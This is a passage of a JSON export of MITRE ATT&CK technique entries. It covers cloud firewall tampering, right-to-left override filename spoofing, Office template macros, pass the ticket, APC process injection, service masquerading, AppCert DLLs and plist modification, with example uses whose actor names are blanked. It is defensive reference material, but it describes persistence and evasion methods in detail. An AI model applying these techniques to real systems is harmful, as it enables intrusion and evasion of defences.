    "description": "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).(Citation: Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for [Brute Force](https://attack.mitre.org/techniques/T1110) or [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499). ",
    "similar_words": [
      "Disable or Modify Cloud Firewall"
    ],
    "id": "T1562.007"
  },
  "attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69": {
    "name": "Right-to-Left Override",
    "example_uses": [
      "has used right-to-left override to reverse executables names to make them appear to have different file extensions rather than their real ones.",
      "has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments.",
      "has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.",
      "has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.",
      "has used Right-to-Left Override to deceive victims into executing several strains of malware."
    ],
    "description": "Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named March 25 \\u202Excod.scr will display as March 25 rcs.docx. A JavaScript file named photo_high_re\\u202Egnp.js will be displayed as photo_high_resj.png.(Citation: Infosecinstitute RTLO Technique)Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",
    "similar_words": [
      "Right-to-Left Override"
    ],
    "id": "T1036.002"
  },
  "attack-pattern--7807d3a4-a885-4639-a786-c1ed41484970": {
    "name": "Malware",
    "example_uses": [
      "has obtained and used malware such as .",
      "During  threat actors used Trojans from underground hacker websites.",
      "For  the threat actors obtained malware including   and AsyncRAT.",
      "has used multiple strains of malware available for purchase on criminal forums or in open-source repositories.",
      "acquired and used the Redline password stealer in their operations.",
      "has used unique malware in their operations including  and .",
      "used publicly available malware for privilege escalation.",
      "has acquired and used  in its operations.",
      "has used a variety of open-source remote access Trojans for its operations.",
      "For  the threat actors used a new backdoor named .",
      "has used a variety of publicly-available remote access Trojans (RATs) for its operations.",
      "has used malware such as  and  in their operations.",
      "has used malware obtained after compromising other threat actors such as .",
      "For  the threat actors used  and  ransomware.",
      "has acquired and used a variety of malware including .",
      "has obtained and used leaked malware including DoublePulsar EternalBlue EternalRocks and EternalSynergy in its operations.",
      "has acquired malware and related tools from dark web forums.",
      "During the  campaign threat actors used open-source malware post-compromise including a custom variant of the cd00r backdoor."
    ],
    "description": "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
    "similar_words": [
      "Malware"
    ],
    "id": "T1588.001"
  },
  "attack-pattern--791481f8-e96a-41be-b089-a088763083d4": {
    "name": "Component Firmware",
    "example_uses": [
      "is known to have the capability to overwrite the firmware on hard drives from some manufacturers.",
      "has maintained persistence by patching legitimate device firmware when it is downloaded including that of WatchGuard devices."
    ],
    "description": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
    "similar_words": [
      "Component Firmware"
    ],
    "id": "T1542.002"
  },
  "attack-pattern--79a4052e-1a89-4b09-aea6-51f1d11fe19c": {
    "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
    "example_uses": [],
    "description": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). ",
    "similar_words": [
      "Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
    ],
    "id": "T1048.001"
  },
  "attack-pattern--79a47ad0-fc3b-4821-9f01-a026b1ddba21": {
    "name": "Office Template Macros",
    "example_uses": [
      "has used a Word Template Normal.dotm for persistence.",
      "has the ability to use hidden columns in Excel spreadsheets to store executable files or commands for VBA macros.",
      "has the ability to use an Excel Workbook to execute additional code by enabling Office to trust macros and execute code without user permission."
    ],
    "description": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) Word Normal.dotm location:<br>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotmExcel Personal.xlsb location:<br>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSBAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
    "similar_words": [
      "Office Template Macros"
    ],
    "id": "T1137.001"
  },
  "attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795": {
    "name": "Virtual Private Server",
    "example_uses": [
      "hosted phishing domains on free services for brief periods of time during campaigns.",
      "During the  campaign  used Virtual Private Server (VPS) infrastructure.",
      "has used VPS hosting providers for infrastructure.",
      "has used VPS hosting providers in targeting of intended victims.",
      "has acquired VPS infrastructure for use in malicious campaigns.",
      "has operated from leased virtual private servers (VPS) in the United States.",
      "has used VPS hosting providers for infrastructure outside of Russia.",
      "has used virtual private servers (VPSs) to host tools perform reconnaissance exploit victim infrastructure and as a destination for data exfiltration.",
      "used adversary-owned and -controlled servers to host web vulnerability scanning applications.",
      "created virtual private server instances to facilitate use of malicious domains and other items.",
      "used acquired Virtual Private Servers as control systems for devices infected with KV Botnet malware.",
      "registered virtual private servers to host payloads for download.",
      "has used acquired Virtual Private Servers as control systems for the ORB network.",
      "During the  threat actors acquired VPS for use in C2.",
      "included the use of dedicated adversary-controlled virtual private servers for command and control.",
      "created adversary-in-the-middle servers to impersonate legitimate services and enable credential capture.",
      "staged encryption keys on virtual private servers operated by the adversary.",
      "has used anonymized infrastructure and Virtual Private Servers (VPSs) to interact with the victims environment.",
      "has used acquired Virtual Private Servers as control systems for devices within the ORB network."
    ],
    "description": "Adversaries may rent Virtual Private Servers (VPSs)that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)",
    "similar_words": [
      "Virtual Private Server"
    ],
    "id": "T1583.003"
  },
  "attack-pattern--7ad38ef1-381a-406d-872a-38b136eb5ecc": {
    "name": "Confluence",
    "example_uses": [
      "has searched a victim's network for collaboration platforms like Confluence and JIRA to discover further high-privilege account credentials."
    ],
    "description": "Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:* Policies, procedures, and standards* Physical / logical network diagrams* System architecture diagrams* Technical system documentation* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))* Work / project schedules* Source code snippets* Links to network shares and other internal resources",
    "similar_words": [
      "Confluence"
    ],
    "id": "T1213.001"
  },
  "attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926": {
    "name": "Pass the Ticket",
    "example_uses": [
      "Some  samples have a module to use pass the ticket with Kerberos for authentication.",
      "used Kerberos ticket attacks for lateral movement.",
      "s LSADUMP::DCSync and KERBEROS::PTT modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.",
      "can also perform pass-the-ticket.",
      "successfully gained remote access by using pass the ticket.",
      "has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access."
    ],
    "description": "Adversaries may pass the ticket using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",
    "similar_words": [
      "Pass the Ticket"
    ],
    "id": "T1550.003"
  },
  "attack-pattern--7b50a1d3-4ca7-45d1-989d-a6503f04bfe1": {
    "name": "Container Administration Command",
    "example_uses": [
      "executed  through the kubelet API run command and by executing commands on running containers.",
      "can use `kubectl` or the Kubernetes API to run commands.",
      "was executed through the kubelet API run command and by executing commands on running containers.",
      "can send kubectl commands to victim clusters through an IRC channel and can run kubectl locally to spread once within a victim cluster.",
      "was executed with an Ubuntu container entry point that runs shell scripts."
    ],
    "description": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as docker exec to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as kubectl exec.(Citation: Kubectl Exec Get Shell)",
    "similar_words": [
      "Container Administration Command"
    ],
    "id": "T1609"
  },
  "attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b": {
    "name": "Dynamic Resolution",
    "example_uses": [
      "has connected to a signalization server that provides a URL and port and then  sends a GET request to that URL to establish C2.",
      "can use dynamic DNS domain names in C2.",
      "For  the threat actors used dynamic DNS services including Duck DNS and DNS Exit as part of their C2 infrastructure.",
      "has used dynamic DNS services for C2 infrastructure.",
      "has used dynamic DNS services to set up C2.",
      "has used DDNS for C2 communications.",
      "has resolved  C2 server IP addresses by either converting Bitcoin blockchain transaction data to specific octets or accessing IP addresses directly within the Namecoin blockchain.",
      "has used Dynamic DNS providers for their malware C2 infrastructure.",
      "can use HTTP to download resources that contain an IP address and port number pair to connect to for C2.",
      "During the   used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.",
      "has forged POST strings with a random choice from a list of possibilities including forum php view etc. while making connection with the C2 hindering detection efforts.",
      "can be configured to use dynamic DNS.",
      "During  the threat actors re-registered a ClouDNS dynamic DNS subdomain which was previously used by .",
      "For  the threat actors used dynamic DNS domains from a variety of free providers including No-IP Oray and 3322.",
      "has used a dynamic DNS service for C2.",
      "has incorporated dynamic DNS domains in its infrastructure.",
      "During  threat actors used dynamic DNS services for C2.",
      "dynamically resolved C2 infrastructure for randomly-generated subdomains within a parent domain.",
      "used dynamic DNS domains associated with malicious infrastructure.",
      "During   used dynamic DNS domains associated with malicious infrastructure."
    ],
    "description": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
    "similar_words": [
      "Dynamic Resolution"
    ],
    "id": "T1568"
  },
  "attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c": {
    "name": "Masquerade Task or Service",
    "example_uses": [
      "has masqueraded its service as a legitimate svchost.exe process.",
      "In one instance  added  as a service with a display name of Corel Writing Tools Utility.",
      "has named a task `RecoveryExTask` as part of its persistence activity.",
      "During the   leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services.",
      "During   used `SCHTASKS /Change` to modify legitimate scheduled tasks to run malicious code.",
      "dispatcher disguises itself as a legitimate task (i.e. the task name and description appear legitimate).",
      "operators have created scheduled tasks masquerading as Windows Update Security Windows Update Security Patches and Google Chrome Security Update designed to launch the ransomware.",
      "has used Windows Video Service as a name for malicious services.",
      "has disguised services to appear as benign software or related to operating system functions.",
      "has copied legitimate service names to use for malicious services.",
      "scheduled task has been named `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` or `MicrosoftEdgeCrashRepoeterTaskMachineUA` depending on the Windows OS version.",
      "has created a scheduled task named MicrosoftEdge to establish persistence.",
      "has masqueraded as the rsyncd and dbus-inotifier services.",
      "has been disguised as the Windows Power Efficiency Diagnostics report tool.",
      "New services created by  are made to appear like legitimate Windows services with names such as Windows Management Help Service Microsoft Support and Windows Advanced Task Manager.",
      "has created a scheduled task named AdobeFlashSync to establish persistence.",
      "has named services and scheduled tasks to appear benign including ChromeCheck and googleupdate.",
      "creates a new service named ntssrv that attempts to appear legitimate; the service's display name is Microsoft Network Realtime Inspection Service and its description is Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols. Newer versions create the MaintenaceSrv service which misspells the word maintenance.",
      "has been disguised as a Windows security update service.",
      "has added itself to the Registry Run key as NVIDIA to appear legitimate.",
      "can mimic the names and descriptions of legitimate services such as `iphlpsvc` `IP Helper` and `Onedrive` to evade detection.",
      "has named services to appear legitimate.",
      "has masqueraded as a service called SaSaut with a display name of System Authorization Service in an apparent attempt to masquerade as a legitimate service.",
      "has pretended to be the xmlProv Network Provisioning service.",
      "has named a service it establishes on victim machines as TaskFrame to hide its malicious purpose.",
      "has used scheduled tasks names such as `acrotyr` and `AppServicesr` to mimic the same names in a compromised network's `C:\\Windows` directory.",
      "has disguised its scheduled tasks as those used by Google.",
      "has used a service named `WSearch` for execution.",
      "has attempted to appear as a legitimate Windows service with a fake description claiming it is used to support packed applications.",
      "can establish persistence by adding a new service NtmsSvc with the display name Removable Storage to masquerade as a legitimate Removable Storage Manager.",
      "has registered a service named `WerFaultSvc` likely to spoof the legitimate Windows error reporting service.",
      "can impersonate Windows services and antivirus products to avoid detection on compromised systems.",
      "has masqueraded the svchost.exe process to exfiltrate data.",
      "renamed task names to masquerade as legitimate Google Chrome Java Dropbox Adobe Reader and Python tasks.",
      "has used hidden or non-printing characters to help masquerade service names such as appending a Unicode no-break space character to a legitimate service name.  has also impersonated the legitimate Flash installer file name install_flashplayer.exe.",
      "creates a scheduled task called WinUpdate to re-establish any dropped C2 connections.",
      "has disguised itself as a known Linux process.",
      "has used scheduled tasks to install  using task names to appear legitimate such as WinDotNet GoogleTask or Sysnetsf. It has also used common document file names for other malware binaries.",
      "has mimicked an existing Windows service by being installed as Windows Time Service.",
      "has named their unit configuration file similarly to other unit files residing in the same directory `/usr/lib/systemd/system/` to appear benign.",
      "has disguised malware as a Windows Security update service.",
      "To establish persistence  adds a Registry Run key with a value TaskMgr in an attempt to masquerade as the legitimate Windows Task Manager.",
      "has named the scheduled task it creates Windows Update.",
      "has renamed the psexec service name to mstdc to masquerade as a legitimate Windows service.",
      "has created a service named Windows Update Agent1 to appear legitimate.",
      "renamed a malicious service taskmgr to appear to be a legitimate version of Task Manager.",
      "has been disguised as a legitimate service using the name PythonUpdateSrvc.",
      "has created a service named `WmdmPmSp` to spoof a Windows Media service.",
      "can create a new service named msamger (Microsoft Security Accounts Manager) which mimics the legitimate Microsoft database by the same name.",
      "can create a task named to appear benign.",
      "has established persistence with a scheduled task impersonating the Outlook item finder.",
      "has installed itself as a new service with the service name `Windows Defender System Service` and display name `WinDefService`.",
      "uses file naming conventions with associated executable locations to blend in with the macOS TimeMachine and OpenSSL services. Such as naming a LaunchAgent plist file `com.apple.openssl.plist` which executes  from the user's `~/Library/OpenSSL/` folder upon user login.",
      "has named the task for a reverse proxy lpupdate to appear legitimate.",
      "has named services to appear legitimate.",
      "variants have attempted to appear legitimate by adding a new service named OfficeUpdateService.",
      "establishes persistence by adding a new service with the display name WMI Performance Adapter Extension in an attempt to masquerade as a legitimate WMI service.",
      "adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.",
      "During  the threat actors named a malicious scheduled task WinUpdate for persistence.",
      "has used `schtasks /change` to modify scheduled tasks including `\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor` `\\Microsoft\\Windows\\Ras\\ManagerMobility \\Microsoft\\Windows\\WDI\\SrvSetupResults` and `\\Microsoft\\Windows\\WDI\\USOShared`.",
      "has created a run key named Dropbox Update Setup to mask a persistence mechanism for a malicious binary.",
      "has created a new executable named `Software Update Check` to appear legitimate.",
      "has named a malicious script CacheTask.bat to mimic a legitimate task.",
      "registers as a service under the Plug-And-Play Support name.",
      "During the   named tasks `\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager` in order to appear legitimate.",
      "The  dropper creates and starts a Windows service named wsmprovav with the description Windows Check AV in an apparent attempt to masquerade as a legitimate service.",
      "named a shellcode loader binary svchast.exe to spoof the legitimate svchost.exe.",
      "has used a scheduled task named `SRCheck` to mask the execution of a malicious .dll.",
      "Some  variants add new services with display names generated by a list of hard-coded strings such as Application Background Security and Windows presumably as a way to masquerade as a legitimate service.",
      "can disguise as a legitimate service to blend into normal operations.",
      "has attempted to disguise itself by registering under a seemingly legitimate service name.",
      "has impersonated systems management software to avoid detection.",
      "has used a task name associated with Windows SQM Consolidator.",
      "has been named `srvdll.dll` to appear as a legitimate service.",
      "has disguised their backdoor droppers with naming conventions designed to blend into normal operations.",
      "has created services to appear as benign system tools.",
      "has established persistence by creating a new service named `FAX` after deleting the legitimate service by the same name.",
      "created new malicious services using names such as Windows User Service to attempt to blend in with legitimate items on victim systems.",
      "overwrites the `argv selects a name from 10 hardcoded names that resemble Linux system daemons such as; `/sbin/udevd -d` `dbus-daemon --system` `avahi-daemon: chroot helper` `/sbin/auditd -n` and `/usr/lib/systemd/systemd-journald`.",
      "will execute its payload prior to initializing command and control traffic by impersonating one of several legitimate program names such as dllhost.exe regsvr32.exe or rundll32.exe.",
      "will attempt to masquerade its service execution using benign-looking names such as ScDeviceEnums.",
      "has distributed malicious scripts and executables mimicking virus scanners.",
      "installation steps include first identifying then stopping any process containing [kworker\\/0:1] then renaming its initial installation stage to this process name.",
      "disguised  as a legitimate Windows binary such as `w3wp.exe` or `conn.exe`.",
      "has created a scheduled task named `CalendarChecker` for persistence on compromised hosts.",
      "masqueraded Registry run keys as legitimate-looking service names such as `OneNote Update` during ."
    ],
    "description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",
    "similar_words": [
      "Masquerade Task or Service"
    ],
    "id": "T1036.004"
  },
  "attack-pattern--7c0f17c9-1af6-4628-9cbd-9e45482dd605": {
    "name": "Asynchronous Procedure Call",
    "example_uses": [
      "is capable of injecting code into the APC queue of a created  process as part of an Early Bird injection.",
      "has used the NtQueueApcThread syscall to inject code into svchost.exe.",
      "can inject its code into a trusted process via the APC queue.",
      "can use asynchronous procedure call (APC) injection to execute commands received from C2.",
      "has written its payload into a newly-created `EhStorAuthn.exe` process using `ZwWriteVirtualMemory` and executed it using `NtQueueApcThread` and `ZwAlertResumeThread`.",
      "has queued an APC routine to explorer.exe by calling ZwQueueApcThread.",
      "has used ZwQueueApcThread to inject itself into remote processes.",
      "can inject itself into a new `svchost.exe -k netsvcs` process using the asynchronous procedure call (APC) queue.",
      "has injected malicious code into a new svchost.exe process.",
      "performs the injection by attaching its code into the APC queue using NtQueueApcThread API.",
      "can use the `QueueUserAPC` API to execute shellcode on a compromised machine.",
      "injects code into the APC queue using `NtQueueApcThread` API."
    ],
    "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA pointing to a malicious DLL). A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "similar_words": [
      "Asynchronous Procedure Call"
    ],
    "id": "T1055.004"
  },
  "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1": {
    "name": "Traffic Duplication",
    "example_uses": [],
    "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
    "similar_words": [
      "Traffic Duplication"
    ],
    "id": "T1020.001"
  },
  "attack-pattern--7d20fff9-8751-404e-badd-ccd71bda0236": {
    "name": "Plist File Modification",
    "example_uses": [
      "uses the plutil command to modify the LSUIElement DFBundleDisplayName and CFBundleIdentifier keys in the /Contents/Info.plist file to change how  is visible on the system.",
      "can create and populate property list (plist) files to enable execution.",
      "In older versions  uses the plutil command to modify the LSUIElement DFBundleDisplayName and CFBundleIdentifier keys in the /Contents/Info.plist file to change how  is visible on the system. In later versions  leverages a third-party notarized `dockutil` tool to modify the `.plist` file responsible for presenting applications to the user in the Dock and LaunchPad to point to a malicious application."
    ],
    "description": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the info.plist file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).For example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the LSUIElement key in an applications info.plist file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as LSEnvironment, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback)",
    "similar_words": [
      "Plist File Modification"
    ],
    "id": "T1647"
  },
  "attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c": {
    "name": "AppCert DLLs",
    "example_uses": [
      "can establish using a AppCertDLLs Registry key."
    ],
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. (Citation: Elastic Process Injection July 2017)Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ",
    "similar_words": [
      "AppCert DLLs"
    ],
    "id": "T1546.009"
  },
  "attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0": {
    "name": "Email Forwarding Rule",
    "example_uses": [
      "has set up auto forwarding rules on compromised e-mail accounts.",
      "has set an Office 365 tenant level mail transport rule to send all mail in and out of the targeted organization to the newly created account.",
      "has set auto-forward rules on victim's e-mail accounts.",
      "has abused email forwarding rules to monitor the activities of a victim steal information and maintain persistent access after compromised credentials are reset."
    ],
